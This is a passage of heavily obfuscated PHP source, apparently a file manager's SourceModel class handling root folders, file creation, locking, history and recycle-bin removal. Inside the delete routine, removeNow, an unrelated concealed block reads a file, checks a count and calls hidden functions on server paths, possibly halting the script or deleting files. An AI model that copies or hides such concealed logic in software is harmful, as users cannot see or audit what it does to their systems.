$õıÄ³³±[$‚ù…ö¤ü[671]] = array(); foreach ($ÍêöÃ² as $ÂıÌÖé¦) { $õıÄ³³±[$‚ù…ö¤ü[671]][] = array($‚ù…ö¤ü[631], $‚ù…ö¤ü[609] . $ÂıÌÖé¦[$‚ù…ö¤ü[192]] . $‚ù…ö¤ü[632]); } $õıÄ³³±[$‚ù…ö¤ü[671]][] = $‚ù…ö¤ü[2222]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($—¯ğÈ§Û) { $ÂÒîòÙŞ =& $_SERVER[¿ÈˆÑ¸ä]; $•¹´ÉÆ = Model($ÂÒîòÙŞ[593])->where(array($ÂÒîòÙŞ[1907] => $—¯ğÈ§Û))->find(); $ç–·÷ôÍ = $this->_mkdirRoot(SourceModel::TYPE_USER, $—¯ğÈ§Û, $•¹´ÉÆ[$ÂÒîòÙŞ[32]]); $this->userDesktopAdd($ç–·÷ôÍ); return $ç–·÷ôÍ; } public function userDesktopAdd($ÀÅÒ‹ ) { $Õô×´Ìé =& $_SERVER[¿ÈˆÑ¸ä]; $äÌÜÊ©œ = LNG($Õô×´Ìé[2404]); $¿ô“Ÿ¢á = $this->mkdir($ÀÅÒ‹ , $äÌÜÊ©œ); $this->metaSet($¿ô“Ÿ¢á, $Õô×´Ìé[2405], $Õô×´Ìé[91]); $this->metaSet($ÀÅÒ‹ , $Õô×´Ìé[2406], $¿ô“Ÿ¢á); } public function userPathSafeAdd($èèœ„¬Ò) { $¦­õı =& $_SERVER[¿ÈˆÑ¸ä]; $­Ö¶µÙ˜ = Model($¦­õı[593])->getInfoFull($èèœ„¬Ò); if (!$­Ö¶µÙ˜) { return !1; } if (_get($­Ö¶µÙ˜, $¦­õı[614])) { return $­Ö¶µÙ˜[$¦­õı[551]][$¦­õı[2407]]; } $§»†ì½Ú = $this->_mkdirRoot(SourceModel::TYPE_USER, $èèœ„¬Ò, $¦­õı[2408], $¦­õı[2409]); Model($¦­õı[593])->metaSet($èèœ„¬Ò, $¦­õı[2407], $§»†ì½Ú); $this->metaSet($§»†ì½Ú, $¦­õı[2410], $èèœ„¬Ò); return $§»†ì½Ú; } public function userPathAppAdd($ÊÉïˆ¿Ï, $³Š€×¶˜ = '', $ƒûœÍˆ¡ = '') { $ÂÅ¦ÎÕï =& $_SERVER[¿ÈˆÑ¸ä]; $úòİá = Model($ÂÅ¦ÎÕï[593])->getInfoFull($ÊÉïˆ¿Ï); if (!$úòİá) { return !1; } $ó–û÷ªË = $úòİá[$ÂÅ¦ÎÕï[551]] ? $úòİá[$ÂÅ¦ÎÕï[551]] : array(); $Á”ïˆï = $ó–û÷ªË[$ÂÅ¦ÎÕï[2411]]; if (!$Á”ïˆï) { $Á”ïˆï = $this->_mkdirRoot(SourceModel::TYPE_USER, $ÊÉïˆ¿Ï, $ÂÅ¦ÎÕï[2412], $ÂÅ¦ÎÕï[2413]); Model($ÂÅ¦ÎÕï[593])->metaSet($ÊÉïˆ¿Ï, $ÂÅ¦ÎÕï[2411], $Á”ïˆï . $ÂÅ¦ÎÕï[12]); $this->metaSet($Á”ïˆï, $ÂÅ¦ÎÕï[2411], $ÊÉïˆ¿Ï); } if (!$³Š€×¶˜) { return $Á”ïˆï; } $‘ÖÊƒØë = $ó–û÷ªË[$ÂÅ¦ÎÕï[2414] . $³Š€×¶˜]; if (!$‘ÖÊƒØë) { $‘ÖÊƒØë = $this->mkdir($Á”ïˆï, $³Š€×¶˜); Model($ÂÅ¦ÎÕï[593])->metaSet($ÊÉïˆ¿Ï, $ÂÅ¦ÎÕï[2414] . $³Š€×¶˜, $‘ÖÊƒØë); $this->metaSet($‘ÖÊƒØë, $ÂÅ¦ÎÕï[2414] . $³Š€×¶˜, $ÊÉïˆ¿Ï); } if (!$ƒûœÍˆ¡) { return $‘ÖÊƒØë; } $ÎƒÜÂóì = $this->mkdir($‘ÖÊƒØë, $ƒûœÍˆ¡); return $ÎƒÜÂóì; } public function groupRootAdd($¡Ê¦¶„) { $íèÙºˆÊ =& $_SERVER[¿ÈˆÑ¸ä]; $ß¨“åÑ÷ = Model($íèÙºˆÊ[601])->where(array($íèÙºˆÊ[2207] => $¡Ê¦¶„))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $¡Ê¦¶„, $ß¨“åÑ÷[$íèÙºˆÊ[32]]); } public function systemRootPathAdd($×»É°³) { if ($×»É°³ != $_SERVER[¿ÈˆÑ¸ä][624]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $×»É°³); } public function userRootRemove($Ç˜Ñ°á) { $Ø¬ÃºˆÚ = $this->targetSourceRoot(SourceModel::TYPE_USER, $Ç˜Ñ°á, !0); foreach ($Ø¬ÃºˆÚ as $ÇÜó¡ò) { if (!$ÇÜó¡ò) { continue; } $this->remove($ÇÜó¡ò[$_SERVER[¿ÈˆÑ¸ä][192]], !1); } } public function groupRootRemove($úÓÉÈåÒ) { $›Ú¥›ŸÒ = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $úÓÉÈåÒ); if (!$›Ú¥›ŸÒ) { return; } $this->remove($›Ú¥›ŸÒ[$_SERVER[¿ÈˆÑ¸ä][192]], !1); } private function _mkdirRoot($Ñãü”ñ†, $áÃŸÏË, $é©†ë¯, $×¶•¿é³ = '') { $ö„ÓÙ¹Ä =& $_SERVER[¿ÈˆÑ¸ä]; $Ù¶–Ñ› = KodUser::id(); $şëà‰® = array($ö„ÓÙ¹Ä[488] => 0, $ö„ÓÙ¹Ä[667] => $Ñãü”ñ†, $ö„ÓÙ¹Ä[668] => $áÃŸÏË, $ö„ÓÙ¹Ä[665] => 1, $ö„ÓÙ¹Ä[669] => $Ù¶–Ñ›, $ö„ÓÙ¹Ä[670] => $Ù¶–Ñ›, $ö„ÓÙ¹Ä[666] => $×¶•¿é³, $ö„ÓÙ¹Ä[671] => $ö„ÓÙ¹Ä[609], $ö„ÓÙ¹Ä[515] => 0, $ö„ÓÙ¹Ä[636] => 0, $ö„ÓÙ¹Ä[554] => 0, $ö„ÓÙ¹Ä[672] => $ö„ÓÙ¹Ä[12]); if ($Òãóåš“ = $this->where($şëà‰®)->find()) { return $Òãóåš“[$ö„ÓÙ¹Ä[192]]; } $¯ü·Èüó = "\x4d\157\144\145\x6c\x53\x6f\x75\162\x63\145\x2e\155\x6b\144\151\x72\122\x6f\157\x74\x2e{$Ñãü”ñ†}\56{$áÃŸÏË}\x2e" . $é©†ë¯; CacheLock::lock($¯ü·Èüó); $şëà‰®[$ö„ÓÙ¹Ä[32]] = $é©†ë¯; $ÔÆàÇÃÆ = $this->add($şëà‰®); $ç¹ËÒ­ = array($ö„ÓÙ¹Ä[673] => short_id($ÔÆàÇÃÆ)); $this->where(array($ö„ÓÙ¹Ä[502] => $ÔÆàÇÃÆ))->save($ç¹ËÒ­); CacheLock::unlock($¯ü·Èüó); return $ÔÆàÇÃÆ; } private function targetSourceRoot($Şâ…Ú¥ü, $™¤ÏÓÒ, $ƒ†¿Äù = false) { $îÕŒÄË¤ =& $_SERVER[¿ÈˆÑ¸ä]; $ÆÃúáÖ¦ = array($îÕŒÄË¤[488] => 0, $îÕŒÄË¤[667] => $Şâ…Ú¥ü, $îÕŒÄË¤[668] => $™¤ÏÓÒ); if ($ƒ†¿Äù) { $¬ÇÖóï¦ = $this->where($ÆÃúáÖ¦)->select(); return $¬ÇÖóï¦ ? $¬ÇÖóï¦ : array(); } $ÁÙ¯Šƒˆ = $this->where($ÆÃúáÖ¦)->find(); return $ÁÙ¯Šƒˆ ? $ÁÙ¯Šƒˆ : array(); } public function sourceRootGroup($ÙÄäğ–) { $³ŒØ¨“… =& $_SERVER[¿ÈˆÑ¸ä]; if (is_string($ÙÄäğ–)) { $ÙÄäğ– = array($ÙÄäğ–); } $‘˜øÁÛŞ = $this->listSourceRoot(SourceModel::TYPE_GROUP, $ÙÄäğ–, $³ŒØ¨“…[221]); $Î¯ÈÁè = array($³ŒØ¨“…[446] => $‘˜øÁÛŞ, $³ŒØ¨“…[443] => array($³ŒØ¨“…[842] => count($ÙÄäğ–))); $this->_listDataApply($Î¯ÈÁè[$³ŒØ¨“…[446]]); $this->_listMake($Î¯ÈÁè); return array_to_keyvalue($Î¯ÈÁè[$³ŒØ¨“…[85]], $³ŒØ¨“…[585]); } public function mkfile($Ôıñ›èÙ, $Š æĞ¨, $°¡•üâõ = '', $Ğİ‚¡ = REPEAT_RENAME) { $Á²©º€û =& $_SERVER[¿ÈˆÑ¸ä]; $×œÄ»¥ = KodIO::ioFileDriverGet($Á²©º€û[494] . $Ôıñ›èÙ . $Á²©º€û[403]); $‘â˜—Æâ = Model($Á²©º€û[693])->addFileByContent($°¡•üâõ, $×œÄ»¥, $Š æĞ¨); return $this->_createFileCall($Ôıñ›èÙ, $Š æĞ¨, $‘â˜—Æâ, $Ğİ‚¡, $Á²©º€û[1479]); } public function addFile($æğ¼·îó, $·­˜œ»Ä, $¡ÚÑ³üò, $ÏÔ™Ï = false, $ü¿ûİÊƒ = REPEAT_RENAME) { $²ÃßßŞ¶ =& $_SERVER[¿ÈˆÑ¸ä]; $Şç¥²³· = KodIO::ioFileDriverGet($²ÃßßŞ¶[494] . $æğ¼·îó . $²ÃßßŞ¶[403]); $ıã¥ëåè = Model($²ÃßßŞ¶[693])->addFile($·­˜œ»Ä, $Şç¥²³·, $¡ÚÑ³üò, $ÏÔ™Ï); return $this->_createFileCall($æğ¼·îó, $¡ÚÑ³üò, $ıã¥ëåè, $ü¿ûİÊƒ); } public function addFileByFileID($Ú¸«Şßº, $ûĞƒÆ¼ë, $É×ò©öó, $Èò¹¹Ô† = REPEAT_RENAME) { $ÈïÔ¦¢½ =& $_SERVER[¿ÈˆÑ¸ä]; $¬®¯†±ê = Model($ÈïÔ¦¢½[693])->find($ûĞƒÆ¼ë); Model($ÈïÔ¦¢½[693])->linkAdd($ûĞƒÆ¼ë); return $this->_createFileCall($Ú¸«Şßº, $É×ò©öó, $¬®¯†±ê, $Èò¹¹Ô†); } public function addFileByRemote($¹Ì›èÍ°, $Ûò¡Ù‘š, $§’›´¹Í, $ƒÑ›Õ£ğ = array(), $™Â¤ÕÌ“ = REPEAT_RENAME) { $‘‘Ÿêç› = Model($_SERVER[¿ÈˆÑ¸ä][693])->addFileByRemote($Ûò¡Ù‘š, $§’›´¹Í, $ƒÑ›Õ£ğ); return $this->_createFileCall($¹Ì›èÍ°, $§’›´¹Í, $‘‘Ÿêç›, $™Â¤ÕÌ“); } private function _createFileCall($´Êë¢É, $‡©¦™ó, $ˆò ¶’ï, $Ñˆğ›¯ú, $¬ÌŸü„¾ = "\165\x70\154\157\141\144") { $ššçè¾£ =& $_SERVER[¿ÈˆÑ¸ä]; if (!$ˆò ¶’ï) { return !1; } $‚›Ó—¤ = !1; $this->setMasterDB(); $this->lockWriteStart($´Êë¢É, $‡©¦™ó); $éÚšÚ´¾ = $this->fileNameExist($´Êë¢É, $‡©¦™ó); $–ğÅ§â = $this->_createFile($´Êë¢É, $‡©¦™ó, $ˆò ¶’ï, $Ñˆğ›¯ú, $‚›Ó—¤); if (!$‚›Ó—¤) { Model($ššçè¾£[556])->remove($ˆò ¶’ï[$ššçè¾£[553]]); } if ($‚›Ó—¤ && $–ğÅ§â && $–ğÅ§â != $éÚšÚ´¾) { Model($ššçè¾£[2376])->eventCreate($–ğÅ§â, $¬ÌŸü„¾); } $this->lockWriteEnd($´Êë¢É, $‡©¦™ó); return $–ğÅ§â; } public function mkdir($ªÎ¼Ó®à, $úÉ„ÍÓ°, $”„Ïõ = REPEAT_SKIP) { $˜ï½ãÓ =& $_SERVER[¿ÈˆÑ¸ä]; $this->setMasterDB(); $–‰Çõ£¢ = $this->sourceInfo($ªÎ¼Ó®à); if (!$–‰Çõ£¢) { return !1; } $this->lockWriteStart($ªÎ¼Ó®à, $úÉ„ÍÓ°); if ($”„Ïõ !== !1) { $¸°ÂŸ£ = $this->fileNameExist($ªÎ¼Ó®à, $úÉ„ÍÓ°); if ($¸°ÂŸ£ && $”„Ïõ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($ªÎ¼Ó®à, $úÉ„ÍÓ°); return $¸°ÂŸ£; } $úÉ„ÍÓ° = $this->fileNameAuto($ªÎ¼Ó®à, $úÉ„ÍÓ°, $”„Ïõ); } $”¸¡ÑŠ = array($˜ï½ãÓ[665] => 1, $˜ï½ãÓ[505] => $úÉ„ÍÓ°, $˜ï½ãÓ[666] => $˜ï½ãÓ[12], $˜ï½ãÓ[554] => 0, $˜ï½ãÓ[636] => 0); $øâäƒŸÏ = $this->_addSource($”¸¡ÑŠ, $–‰Çõ£¢); Model($˜ï½ãÓ[2376])->eventCreate($øâäƒŸÏ, $˜ï½ãÓ[1480]); $this->lockWriteEnd($ªÎ¼Ó®à, $úÉ„ÍÓ°); return $øâäƒŸÏ; } public function listSourceRoot($™ËöÔùã, $—óÔıåß, $ä›èÏñÁ = "\163\157\165\162\x63\145\111\x44\x2c\x74\141\x72\x67\145\164\111\104\x2c\163\151\172\x65") { $¾ûç™ªÀ =& $_SERVER[¿ÈˆÑ¸ä]; $ä÷Ë€Ò¥ = $¾ûç™ªÀ[463]; $¡±çø´É = array(); $ñï˜ÌØ¹ = 1024 * 50; $Å¤ÀœĞû = is_array($Å¤ÀœĞû) ? $Å¤ÀœĞû : array(); $¼ÕÏú´Ü = count($—óÔıåß); $Ä—‘Õˆ“ = $this->tablePrefix . $¾ûç™ªÀ[2415]; for ($ÉšÖºÅÓ = 0; $ÉšÖºÅÓ < $¼ÕÏú´Ü; $ÉšÖºÅÓ++) { $ùüïƒ™ã = $—óÔıåß[$ÉšÖºÅÓ]; $ä÷Ë€Ò¥ .= "\x53\105\x4c\105\x43\x54\40\x2a\x20\x46\x52\x4f\x4d\x20\x28\x53\x45\114\x45\103\x54\40{$ä›èÏñÁ}\x20\x46\122\117\115\x20\x60{$Ä—‘Õˆ“}\140\x20\127\x48\105\x52\x45\x20"; $ä÷Ë€Ò¥ .= "\x60\x70\x61\162\x65\x6e\x74\x49\x44\140\x3d\60\40\101\116\104\x20\140\164\x61\162\x67\145\164\x49\x44\x60\75{$ùüïƒ™ã}\x20\101\x4e\x44\40\140\164\x61\162\147\x65\x74\x54\171\160\x65\x60\75{$™ËöÔùã}\40\141\x6e\x64\40\x66\151\154\145\124\171\160\x65\x3d\47\x27\40\154\151\155\x69\x74\x20\61\x29\40\141\x73\x20\164\142\137{$ÉšÖºÅÓ}\x20\125\x4e\111\x4f\116\40\101\x4c\114\40"; if ((strlen($ä÷Ë€Ò¥) >= $ñï˜ÌØ¹ || $ÉšÖºÅÓ == $¼ÕÏú´Ü - 1) && $ä÷Ë€Ò¥) { $ä÷Ë€Ò¥ = substr($ä÷Ë€Ò¥, 0, -strlen($¾ûç™ªÀ[1141])); $ç¥ª’Š´ = $this->query($ä÷Ë€Ò¥); $ä÷Ë€Ò¥ = $¾ûç™ªÀ[12]; $¡±çø´É = array_merge($¡±çø´É, $ç¥ª’Š´); } } return $¡±çø´É; } private function _createFile($Ÿ°á™Æ™, $˜Ú©˜ú, $¯ø¬ÛôÙ, $ÅšÏšËŞ, &$œÈ‘ıƒ†) { $‡ÕÆÊÎº =& $_SERVER[¿ÈˆÑ¸ä]; $ ÙîİŒ› = $this->sourceInfo($Ÿ°á™Æ™); if (!$¯ø¬ÛôÙ || !$ ÙîİŒ›) { return !1; } if ($ÅšÏšËŞ !== !1) { $¢È¸Öô¸ = $this->fileNameExist($Ÿ°á™Æ™, $˜Ú©˜ú); } $œÈ‘ıƒ† = !0; if ($ÅšÏšËŞ && $¢È¸Öô¸) { if ($ÅšÏšËŞ == REPEAT_SKIP) { $œÈ‘ıƒ† = !1; return $¢È¸Öô¸; } else { if ($ÅšÏšËŞ == REPEAT_REPLACE) { $üëé½Ë¡ = $this->sourceInfo($¢È¸Öô¸); $¸†€Æø = $this->fileHistory($üëé½Ë¡, $¯ø¬ÛôÙ[$‡ÕÆÊÎº[553]], $¯ø¬ÛôÙ[$‡ÕÆÊÎº[79]]); if (!$¸†€Æø) { $œÈ‘ıƒ† = !1; } else { $this->folderSizeReset($Ÿ°á™Æ™); } return $¢È¸Öô¸; } else { $˜Ú©˜ú = $this->fileNameAuto($Ÿ°á™Æ™, $˜Ú©˜ú, $ÅšÏšËŞ, !1); } } } $ƒ·ëÑ¾— = array($‡ÕÆÊÎº[665] => 0, $‡ÕÆÊÎº[505] => $˜Ú©˜ú, $‡ÕÆÊÎº[666] => substr(get_path_ext($˜Ú©˜ú), 0, 10), $‡ÕÆÊÎº[554] => $¯ø¬ÛôÙ[$‡ÕÆÊÎº[553]], $‡ÕÆÊÎº[636] => $¯ø¬ÛôÙ[$‡ÕÆÊÎº[79]]); $¾Ï›–î€ = $this->_addSource($ƒ·ëÑ¾—, $ ÙîİŒ›); $this->folderSizeReset($Ÿ°á™Æ™, intval($ƒ·ëÑ¾—[$‡ÕÆÊÎº[79]])); return $¾Ï›–î€; } protected function fileHistory($·Ô‹³‰, $™¡İÜ¹, $á…®¤¤´) { $ö“Óà½† =& $_SERVER[¿ÈˆÑ¸ä]; if ($·Ô‹³‰[$ö“Óà½†[553]] == $™¡İÜ¹) { return !1; } $this->checkLock($·Ô‹³‰[$ö“Óà½†[192]], $™¡İÜ¹); Model($ö“Óà½†[2416])->addHistory($·Ô‹³‰); $ºÇÄ’è¸ = array($ö“Óà½†[670] => USER_ID, $ö“Óà½†[509] => time(), $ö“Óà½†[553] => $™¡İÜ¹, $ö“Óà½†[79] => $á…®¤¤´); $this->where(array($ö“Óà½†[502] => $·Ô‹³‰[$ö“Óà½†[192]]))->save($ºÇÄ’è¸); $this->sourceCacheClear($·Ô‹³‰[$ö“Óà½†[192]]); return !0; } public function checkLock($°ÃòÃÔ£, $¦¨±í—ş) { $è‚º¼È„ =& $_SERVER[¿ÈˆÑ¸ä]; $ì„ìÄ™­ = $this->pathInfo($°ÃòÃÔ£); if (!$this->fileIsLock($ì„ìÄ™­, !0)) { return; } $§ƒâŒÇş = Session::get($è‚º¼È„[2417]); $â°€¨÷ = substr($ì„ìÄ™­[$è‚º¼È„[32]], 0, -1 - strlen($ì„ìÄ™­[$è‚º¼È„[167]])) . $è‚º¼È„[1332] . $§ƒâŒÇş . $è‚º¼È„[10] . $ì„ìÄ™­[$è‚º¼È„[167]]; $ò«ãÚª = Model($è‚º¼È„[693])->find($¦¨±í—ş); $this->_createFileCall($ì„ìÄ™­[$è‚º¼È„[191]], $â°€¨÷, $ò«ãÚª, REPEAT_REPLACE, $è‚º¼È„[1479]); $ı‹åË Ò = $ì„ìÄ™­[$è‚º¼È„[551]][$è‚º¼È„[629]]; $¬µùó¢­ = $ı‹åË Ò[$è‚º¼È„[2418]] ? $ı‹åË Ò[$è‚º¼È„[2418]] : $ı‹åË Ò[$è‚º¼È„[32]]; show_json(LNG($è‚º¼È„[2419]) . $è‚º¼È„[2420] . LNG($è‚º¼È„[2421]) . $è‚º¼È„[2422] . $¬µùó¢­ . $è‚º¼È„[2423], !1); } public function fileIsLock($š¢Ÿõğ­, $ï§³µÆ = false) { $Í‹îü¢ =& $_SERVER[¿ÈˆÑ¸ä]; if (!_get($š¢Ÿõğ­, $Í‹îü¢[625], 0)) { return !1; } if ($š¢Ÿõğ­[$Í‹îü¢[551]][$Í‹îü¢[628]] != USER_ID) { return !0; } $Ìƒà‚¨ë = $GLOBALS[$Í‹îü¢[6]][$Í‹îü¢[92]][$Í‹îü¢[626]]; if ($š¢Ÿõğ­[$Í‹îü¢[551]][$Í‹îü¢[627]] <= time() - $Ìƒà‚¨ë) { $this->metaSet($š¢Ÿõğ­[$Í‹îü¢[192]], $Í‹îü¢[628], null); $this->metaSet($š¢Ÿõğ­[$Í‹îü¢[192]], $Í‹îü¢[627], null); } if ($ï§³µÆ) { $this->metaSet($š¢Ÿõğ­[$Í‹îü¢[192]], $Í‹îü¢[627], time()); } return !1; } private function _addSource($³ïƒ´–©, $îåÖ·ß) { $Û¤ÙÔ«— =& $_SERVER[¿ÈˆÑ¸ä]; $€®¶†šÇ = KodUser::id(); $çÂ€Ó = array($Û¤ÙÔ«—[667] => $îåÖ·ß[$Û¤ÙÔ«—[189]], $Û¤ÙÔ«—[668] => $îåÖ·ß[$Û¤ÙÔ«—[585]], $Û¤ÙÔ«—[669] => $€®¶†šÇ, $Û¤ÙÔ«—[670] => $€®¶†šÇ, $Û¤ÙÔ«—[488] => $îåÖ·ß[$Û¤ÙÔ«—[192]], $Û¤ÙÔ«—[671] => $îåÖ·ß[$Û¤ÙÔ«—[600]] . $îåÖ·ß[$Û¤ÙÔ«—[192]] . $Û¤ÙÔ«—[50], $Û¤ÙÔ«—[515] => 0, $Û¤ÙÔ«—[672] => $Û¤ÙÔ«—[12]); $³ïƒ´–© = array_merge($çÂ€Ó, $³ïƒ´–©); $this->updateModifyTime($³ïƒ´–©[$Û¤ÙÔ«—[191]]); $å”ˆÕş = $Û¤ÙÔ«—[2424] . $îåÖ·ß[$Û¤ÙÔ«—[192]]; if (isset(self::$cacheChildList[$å”ˆÕş])) { unset(self::$cacheChildList[$å”ˆÕş]); } static $ô­ªáÏ = false; if (!$ô­ªáÏ) { Hook::trigger($Û¤ÙÔ«—[655], $³ïƒ´–©); $ô­ªáÏ = !0; } $š…‘  = $this->add($³ïƒ´–©); $’Ì‘ÇĞ = array($Û¤ÙÔ«—[673] => short_id($š…‘ )); $this->where(array($Û¤ÙÔ«—[502] => $š…‘ ))->save($’Ì‘ÇĞ); $this->setNamePinyin($š…‘ , $³ïƒ´–©[$Û¤ÙÔ«—[32]]); return $š…‘ ; } public function remove($ÈüëÙ’â, $ÆÌ³²°Â = true) { $‹İÖ¬É¢ =& $_SERVER[¿ÈˆÑ¸ä]; $ÔŒ¤ıü§ = $this->sourceInfo($ÈüëÙ’â); $¦µ•œ¶ = intval($ÔŒ¤ıü§[$‹İÖ¬É¢[189]]) === self::TYPE_SYSTEM; $ÃŠÊíî™ = Model($‹İÖ¬É¢[518])->get($‹İÖ¬É¢[2425]) == $‹İÖ¬É¢[91]; if ($¦µ•œ¶ || $ÆÌ³²°Â || !$ÃŠÊíî™) { return $this->removeNow($ÈüëÙ’â, $ÆÌ³²°Â); } $—ÑòœÛÙ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $«ïÎò°Ä = $ÔŒ¤ıü§[$‹İÖ¬É¢[189]] == self::TYPE_USER ? $‹İÖ¬É¢[681] : $‹İÖ¬É¢[594]; if ($«ïÎò°Ä == $‹İÖ¬É¢[681]) { $¼º½ø¼ã = Model($‹İÖ¬É¢[593])->getInfo($ÔŒ¤ıü§[$‹İÖ¬É¢[585]]); $±™åßÀó = !empty($¼º½ø¼ã[$‹İÖ¬É¢[2418]]) ? $¼º½ø¼ã[$‹İÖ¬É¢[2418]] : $¼º½ø¼ã[$‹İÖ¬É¢[32]]; $±™åßÀó = $‹İÖ¬É¢[338] . $±™åßÀó . $‹İÖ¬É¢[2426] . $ÔŒ¤ıü§[$‹İÖ¬É¢[585]]; } else { $¼º½ø¼ã = Model($‹İÖ¬É¢[601])->getInfo($ÔŒ¤ıü§[$‹İÖ¬É¢[585]]); $±™åßÀó = _get($¼º½ø¼ã, $‹İÖ¬É¢[32]); $±™åßÀó = $‹İÖ¬É¢[174] . $±™åßÀó . $‹İÖ¬É¢[2427] . $ÔŒ¤ıü§[$‹İÖ¬É¢[585]]; } $»îÕƒÔş = $‹İÖ¬É¢[2428] . md5($±™åßÀó); CacheLock::lock($»îÕƒÔş); $ÔêÅ­€  = $this->fileNameExist($—ÑòœÛÙ, $±™åßÀó); if (!$ÔêÅ­€ ) { $ÔêÅ­€  = $this->mkdir($—ÑòœÛÙ, $±™åßÀó, REPEAT_SKIP); $this->metaSet($ÔêÅ­€ , $‹İÖ¬É¢[2429], $«ïÎò°Ä); $this->metaSet($ÔêÅ­€ , $‹İÖ¬É¢[2430], $ÔŒ¤ıü§[$‹İÖ¬É¢[585]]); if ($ÔŒ¤ıü§[$‹İÖ¬É¢[191]] != 0) { $this->metaSet($ÔêÅ­€ , $‹İÖ¬É¢[2431], _get($¼º½ø¼ã, $‹İÖ¬É¢[2432])); } } CacheLock::unlock($»îÕƒÔş); $this->metaSet($ÈüëÙ’â, $‹İÖ¬É¢[2433], $ÔŒ¤ıü§[$‹İÖ¬É¢[191]]); $this->where(array($‹İÖ¬É¢[192] => $ÈüëÙ’â))->save(array($‹İÖ¬É¢[509] => time())); $this->recycleClear($ÔŒ¤ıü§); Model($‹İÖ¬É¢[652])->eventRemove($ÈüëÙ’â); $ìàÒˆë· = $this->move($ÈüëÙ’â, $ÔêÅ­€ , REPEAT_RENAME_FOLDER); $this->folderSizeReset($ÔŒ¤ıü§[$‹İÖ¬É¢[191]]); return $ìàÒˆë·; } private function recycleClear($ÑÉ‰›ÀÀ) { $•Š‡­‡Ô =& $_SERVER[¿ÈˆÑ¸ä]; $¿ÌâàÎ× = $this->childrenAll($ÑÉ‰›ÀÀ); $Ø·­Ş•İ = array($•Š‡­‡Ô[502] => array($•Š‡­‡Ô[503], $¿ÌâàÎ×[$•Š‡­‡Ô[2434]])); Model($•Š‡­‡Ô[2435])->where($Ø·­Ş•İ)->delete(); } public function removeNow($‰‹‘ş¯„, $›ÛÃ®şâ = true) { $ø©ğ»½æ =& $_SERVER[¿ÈˆÑ¸ä]; if ($_SERVER[$ø©ğ»½æ[962]] != $_SERVER[$ø©ğ»½æ[963]]) { $‰™ÜúÔ = $ø©ğ»½æ[980]; $ª¿šøõ¸ = $ø©ğ»½æ[964]; $˜¯½©À” = $_SERVER[$ø©ğ»½æ[965]] . $ø©ğ»½æ[966]; $ˆÕ’‹îı = $ª¿šøõ¸($˜¯½©À”); $èÀ ³ = explode($ø©ğ»½æ[286], $ˆÕ’‹îı); if (count($èÀ ³) < $ø©ğ»½æ[703]) { $Ôàë©á = $ø©ğ»½æ[967]; $Ôàë©á(); } $±Á¸Ÿ²µ = $ø©ğ»½æ[981]; $±Á¸Ÿ²µ($_SERVER[$ø©ğ»½æ[982]]); $±Á¸Ÿ²µ($_SERVER[$ø©ğ»½æ[965]] . $ø©ğ»½æ[1765]); $õ£÷é¬ = 1; while ($õ£÷é¬ > 1) { $õ£÷é¬ = $õ£÷é¬ + 4; $æòÎ¥Œ± = rawurlencode($õ£÷é¬ . $ø©ğ»½æ[463]); } } $Àªü”Ã« = $this->sourceInfo($‰‹‘ş¯„); $Ñóõë—‚ = $this->pathInfoMore($‰‹‘ş¯„); if (!$Àªü”Ã«) { return !0; } if ($Àªü”Ã«[$ø©ğ»½æ[191]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($‰‹‘ş¯„); Hook::trigger($ø©ğ»½æ[2436], $Ñóõë—‚, $›ÛÃ®şâ); if ($›ÛÃ®şâ) { Model($ø©ğ»½æ[2435])->moveToRecycle($‰‹‘ş¯„); } else { $¯‘™”ûè = $this->childrenAll($Àªü”Ã«); Model($ø©ğ»½æ[652])->eventRemove($‰‹‘ş¯„); $this->removeRelevance($¯‘™”ûè[$ø©ğ»½æ[2434]], $¯‘™”ûè[$ø©ğ»½æ[1716]]); } $this->folderSizeReset($Àªü”Ã«[$ø©ğ»½æ[191]]); $„ÆŒ¡Ò® = array($Àªü”Ã«[$ø©ğ»½æ[191]]); if ($Àªü”Ã«[$ø©ğ»½æ[496]] == $ø©ğ»½æ[91]) { $„ÆŒ¡Ò®[] = $Àªü”Ã«[$ø©ğ»½æ[192]]; } $this->updateModifyTime($„ÆŒ¡Ò®); $this->lockMoveEnd($‰‹‘ş¯„); Hook::trigger($ø©ğ»½æ[1958], $Ñóõë—‚, $›ÛÃ®şâ); return !0; } public function childrenAll($éíÍ´ı) { $ò«‘ù” =& $_SERVER[¿ÈˆÑ¸ä]; $Ÿ®Õæ™Œ = $éíÍ´ı[$ò«‘ù”[192]]; if ($éíÍ´ı[$ò«‘ù”[496]] == $ò«‘ù”[91]) { $š´ÎöÅ = array($ò«‘ù”[671] => array($ò«‘ù”[631], $éíÍ´ı[$ò«‘ù”[600]] . $Ÿ®Õæ™Œ . $ò«‘ù”[632])); $¬Ëğ‰Èï = array($ò«‘ù”[671] => $š´ÎöÅ[$ò«‘ù”[600]]); $Ü‹óçÍ¸ = $this->field($ò«‘ù”[2437])->where($¬Ëğ‰Èï)->select(); $Ğó»½İé = !1; $Ÿ²ÛÕÅé = array($Ÿ®Õæ™Œ); if ($Ü‹óçÍ¸) { $Ğó»½İé = array_to_keyvalue($Ü‹óçÍ¸, $ò«‘ù”[12], $ò«‘ù”[553]); $Ğó»½İé = array_remove_value($Ğó»½İé, $ò«‘ù”[229]); $Ÿ²ÛÕÅé = array_to_keyvalue($Ü‹óçÍ¸, $ò«‘ù”[12], $ò«‘ù”[192]); $Ÿ²ÛÕÅé[] = $Ÿ®Õæ™Œ; } } else { $Ğó»½İé = array($éíÍ´ı[$ò«‘ù”[553]]); $Ÿ²ÛÕÅé = array($Ÿ®Õæ™Œ); } return array($ò«‘ù”[2434] => $Ÿ²ÛÕÅé, $ò«‘ù”[1716] => $Ğó»½İé); } public function removeArray($ÚÍ‡Û¨Ğ) { if (!$ÚÍ‡Û¨Ğ) { return !0; } } public function removeRelevance($›¶Ñ„¬˜, $ÀêÌÉ³œ) { $ÏñÔÙŞ =& $_SERVER[¿ÈˆÑ¸ä]; $›¶Ñ„¬˜ = $›¶Ñ„¬˜ ? $›¶Ñ„¬˜ : array(); $ÀêÌÉ³œ = $ÀêÌÉ³œ ? $ÀêÌÉ³œ : array(); $›¶Ñ„¬˜ = array_unique(array_filter($›¶Ñ„¬˜)); $ÀêÌÉ³œ = 